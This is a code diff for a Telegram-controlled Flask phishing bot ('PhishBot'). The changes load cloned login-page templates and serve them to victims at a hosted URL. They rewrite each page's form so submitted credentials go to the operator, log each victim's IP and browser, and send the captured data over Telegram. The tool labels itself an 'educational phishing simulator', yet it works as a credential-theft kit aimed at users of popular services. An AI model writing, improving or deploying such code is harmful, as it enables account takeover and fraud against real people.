@@ -9,6 +9,8 @@ from datetime import datetime
 import shutil
 import time
 import logging
+import glob
+import re
 
 # Set up logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -34,11 +36,24 @@ def initialize_creds_file():
             json.dump({}, f)
 
 
-# List of websites to imitate for phishing
-TEMPLATES = [
-    "Instagram", "Facebook", "Netflix", "Twitter", "Snapchat",
-    "GitHub", "LinkedIn", "Spotify", "Reddit", "Amazon", "Sample"
-]
+# Directory for templates
+TEMPLATES_DIR = "Templates"
+
+
+# Function to get all available templates
+def get_available_templates():
+    templates = []
+    # Look for all directories in the Templates folder
+    template_dirs = [d for d in os.listdir(TEMPLATES_DIR)
+                     if os.path.isdir(os.path.join(TEMPLATES_DIR, d))]
+
+    for template in template_dirs:
+        # Check if the template has an index.html file
+        if os.path.exists(os.path.join(TEMPLATES_DIR, template, "index.html")):
+            templates.append(template)
+
+    return templates
+
 
 # Dictionary to store user states if needed for multi-step operations
 user_states = {}
@@ -54,7 +69,15 @@ def home():
 @app.route('/status')
 def status():
     global is_bot_running
-    return f"Bot running: {is_bot_running}, Flask is active"
+    templates = get_available_templates()
+    return f"Bot running: {is_bot_running}, Flask is active, Available templates: {', '.join(templates)}"
+
+
+# Route to serve static files (CSS, JS, images)
+@app.route('/phish/<user_id>/<path:filename>')
+def serve_static(user_id, filename):
+    folder = f"phished_pages/{user_id}"
+    return send_from_directory(folder, filename)
 
 
 # Route to serve the phishing page to victims
@@ -75,6 +98,7 @@ def capture_creds(user_id):
     # Add timestamp and IP for tracking
     creds['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     creds['ip'] = request.remote_addr
+    creds['user_agent'] = request.headers.get('User-Agent', 'Unknown')
 
     # Format credentials as text for Telegram message
     msg = "\n".join(f"{k}: {v}" for k, v in creds.items())
@@ -119,6 +143,7 @@ def send_welcome(message):
         "🎣 Welcome to PhishBot!\n\n"
         "Commands:\n"
         "/fish - Start phishing\n"
+        "/templates - List available templates\n"
         "/info - About\n"
         "/history - View your captured credentials"
     ))
@@ -128,6 +153,17 @@ def send_welcome(message):
 @bot.message_handler(commands=['info'])
 def send_info(message):
     bot.reply_to(message, "Educational phishing simulator.")
+
+
+# Command handler for /templates
+@bot.message_handler(commands=['templates'])
+def list_templates(message):
+    templates = get_available_templates()
+    if templates:
+        template_list = "\n".join([f"• {template}" for template in templates])
+        bot.send_message(message.chat.id, f"📋 Available templates:\n\n{template_list}\n\nUse /fish to select one.")
+    else:
+        bot.send_message(message.chat.id, "❌ No templates found. Please add templates to the Templates directory.")
 
 
 # Command handler for viewing credential history
@@ -160,29 +196,45 @@ def view_history(message):
 # Command handler for /fish
 @bot.message_handler(commands=['fish'])
 def send_fish_menu(message):
-    # Create a custom keyboard with website options
+    # Get available templates
+    templates = get_available_templates()
+
+    if not templates:
+        bot.send_message(message.chat.id, "❌ No templates found. Please add templates to the Templates directory.")
+        return
+
+    # Create a custom keyboard with template options
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    buttons = [types.KeyboardButton(site) for site in TEMPLATES]
+    buttons = [types.KeyboardButton(template) for template in templates]
     markup.add(*buttons)
     bot.send_message(message.chat.id, "📄 Choose a phishing template:", reply_markup=markup)
 
 
 # Message handler for template selection
-@bot.message_handler(func=lambda msg: msg.text in TEMPLATES)
+@bot.message_handler(func=lambda msg: msg.text in get_available_templates())
 def handle_template_selection(message):
     template = message.text
     user_id = str(message.chat.id)
     bot.send_message(message.chat.id, f"⚙️ Generating phishing page for {template}...")
 
     # Locate template and create output directory
-    template_path = f"Templates/{template}/index.html"
+    template_path = f"{TEMPLATES_DIR}/{template}/index.html"
     output_path = f"phished_pages/{user_id}"
+
+    # Remove existing files if any
+    if os.path.exists(output_path):
+        try:
+            shutil.rmtree(output_path)
+        except Exception as e:
+            logger.error(f"Error removing existing directory: {e}")
+
+    # Create fresh directory
     os.makedirs(output_path, exist_ok=True)
 
     if os.path.exists(template_path):
         try:
             # Copy the template directory contents to the user's directory
-            template_dir = f"Templates/{template}"
+            template_dir = f"{TEMPLATES_DIR}/{template}"
             for item in os.listdir(template_dir):
                 src = os.path.join(template_dir, item)
                 dst = os.path.join(output_path, item)
@@ -192,10 +244,11 @@ def handle_template_selection(message):
                     shutil.copytree(src, dst, dirs_exist_ok=True)
 
             # Modify the HTML to include the user_id in form action
-            modify_html_form(f"{output_path}/index.html", user_id)
-
-            phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
-            bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
+            if modify_html_form(f"{output_path}/index.html", user_id):
+                phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
+                bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
+            else:
+                bot.send_message(message.chat.id, "❌ Failed to modify HTML form.")
         except Exception as e:
             bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
     else:
@@ -208,8 +261,21 @@ def modify_html_form(html_path, user_id):
         with open(html_path, 'r', encoding='utf-8') as f:
             content = f.read()
 
-        # Replace form action with our submission URL
-        modified = content.replace('action="', f'action="/submit/{user_id}"')
+        # More robust form detection and modification
+        # Look for form elements with action attributes
+        form_pattern = re.compile(r'<form.*?action=["\'](.*?)["\']', re.IGNORECASE | re.DOTALL)
+
+        if form_pattern.search(content):
+            # Replace form action with our submission URL
+            modified = form_pattern.sub(f'<form action="/submit/{user_id}"', content)
+        else:
+            # If no form with action found, look for any form and add action
+            form_pattern = re.compile(r'<form', re.IGNORECASE)
+            if form_pattern.search(content):
+                modified = form_pattern.sub(f'<form action="/submit/{user_id}"', content)
+            else:
+                logger.warning(f"No form found in {html_path}")
+                return False
 
         with open(html_path, 'w', encoding='utf-8') as f:
             f.write(modified)
@@ -254,6 +320,11 @@ if __name__ == '__main__':
 
     # Create directories if they don't exist
     os.makedirs("phished_pages", exist_ok=True)
+    os.makedirs(TEMPLATES_DIR, exist_ok=True)
+
+    # List available templates on startup
+    templates = get_available_templates()
+    logger.info(f"Available templates: {templates}")
 
     # Try to stop any existing bot instances
     try:
